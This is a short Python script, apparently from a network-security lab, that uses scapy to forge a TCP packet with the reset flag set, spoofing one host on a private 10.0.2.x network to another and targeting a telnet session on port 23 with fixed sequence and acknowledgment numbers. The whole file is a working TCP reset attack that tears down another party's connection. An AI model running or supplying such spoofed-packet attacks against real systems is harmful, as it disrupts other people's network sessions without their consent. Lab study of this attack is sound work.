#!/usr/bin/python
from scapy.all import *
ip = IP(src="10.0.2.6", dst="10.0.2.7")
tcp = TCP(sport=43472, dport=23, flags=0x04, seq=2822017494, ack=525263333)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)

